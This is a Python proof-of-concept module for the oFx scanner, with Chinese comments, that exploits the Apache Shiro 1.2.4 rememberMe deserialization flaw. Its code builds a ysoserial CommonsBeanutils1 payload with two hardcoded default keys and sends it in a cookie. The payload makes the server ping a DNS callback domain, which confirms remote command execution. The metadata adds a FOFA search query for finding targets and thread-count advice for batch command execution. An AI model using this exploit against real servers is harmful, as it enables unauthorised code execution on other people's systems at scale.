# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, get_shiro_payload_from_yso, get_ceye_dns, verify_ceye_dns,gen_title
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
            jijue：
            该POC目前的形态属于实验性质。
            这个POC会动态的调用ysoserial生成payload，由于每个目标都会生成唯一的dns子域名payload，所以每一个目标都会运行一次ysoserial，
            简单来说，如果起了100个线程，意味着同时开了一百个ysoserial，对性能的要求就会比较高，后续的话笔者可能会针对这个链单独写一个小一点的jar包。
            如果可以解决性能问题，可能会弄一些密钥字典。
            
            同样的，漏报率也相当高，一般dnslog收到50个不同的唯一请求，oFx最多只上报8-9个漏洞，有些匪夷所思，目前还没弄清楚原因。
            因此建议是批量执行命令或单个目标检测的使用场景推荐大数量的线程，批量检测的话建议线程数少一点，10-20差不多了。  
            
            兼容了Pb-CMS的shiro反序列化，默认key为3AvVhmFLUs0KTA3Kprsdag==
        """,  # POC描述，写更新描述，没有就不写

        "name": "Shiro 1.2.4 反序列化漏洞",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
        
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="APACHE-Shiro"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        success, dns_flag = get_ceye_dns()
        if success == False:
            return [False, dns_flag]

        keys = [
            "kPH+bIxk5D2deZiIxcaaaA==",  # Shiro的默认key
            "3AvVhmFLUs0KTA3Kprsdag=="  # Pb-CMS的默认key
                ]

        url = self.target + "/"  # url自己按需调整

        for key in keys:
            payload = get_shiro_payload_from_yso("CommonsBeanutils1", "ping " + dns_flag,key)

            headers = {
                "User-Agent": get_random_ua(),
                "Connection": "close",
                "Cookie": "rememberMe=" + payload
            }

            try:
                """
                检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
                """
                req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
                flager = verify_ceye_dns(dns_flag)

                if flager == True:
                    vuln = [True, gen_title(key + " / " +dns_flag)]
                    break
                elif flager == False:
                    vuln = [False, gen_title(key + " / " +dns_flag)]
                else:
                    vuln = [False, flager]
            except Exception as e:
                raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        vuln = self._verify()
        return vuln
